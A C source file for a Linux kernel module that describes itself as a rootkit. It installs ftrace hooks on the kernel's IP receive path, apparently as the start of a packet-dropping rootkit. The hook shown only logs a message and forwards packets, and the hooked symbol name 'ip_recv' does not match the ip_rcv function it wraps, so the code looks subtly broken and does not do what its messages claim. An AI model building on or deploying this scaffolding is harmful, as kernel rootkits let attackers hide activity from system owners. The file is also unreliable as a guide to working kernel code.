#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include "ftrace_helper2.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a kernel module rootkit");
MODULE_VERSION("1");


//static asmlinkage int (*old_tcp4_seq_show)(struct seq_file *seq, void *v);
//static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v);

asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
	   struct net_device *orig_dev);

asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
	   struct net_device *orig_dev);

static struct ftrace_hook hooks[] = {
 	HOOK("ip_recv", new_ip_rcv, &old_ip_rcv),
 };


static int __init rootkit_enter(void) {

	int err;

	printk(KERN_INFO "ip drop rootkit: is operating\n");
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;


	return 0;
}

static void __exit rootkit_exit(void) {


	//remove ftrace hooks
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "ip drop rootkit: stopped\n");
}



asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
	   struct net_device *orig_dev) {
	printk("hooked ip_recv! hooray\n");
	return old_ip_rcv(skb, dev, pt, orig_dev);

}



module_init(rootkit_enter);
module_exit(rootkit_exit);

